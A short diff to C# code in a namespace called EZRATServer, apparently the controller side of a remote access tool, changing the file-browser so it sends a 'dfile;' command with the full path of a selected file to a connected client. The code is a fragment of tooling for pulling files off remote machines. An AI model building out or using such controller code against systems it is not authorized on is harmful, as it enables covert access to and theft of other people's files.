@@ -22,6 +22,13 @@ namespace EZRATServer
             set { _id = value; }
         }
 
+
+        private string _pathDownload;
+
+
+
+        public string PathDownload { get => _pathDownload; set => _pathDownload = value; }
+
         private string _path;
 
         public string Path
@@ -58,7 +65,8 @@ namespace EZRATServer
 
         private void DownloadFile(object sender,EventArgs e)
         {
-            this.BaseWindows.SendCommand("dfile;" + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text, this.Id);
+            this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
+            this.BaseWindows.SendCommand("dfile;" + this.PathDownload , this.Id);
         }
 
         private void UpPath(object sender, EventArgs e)
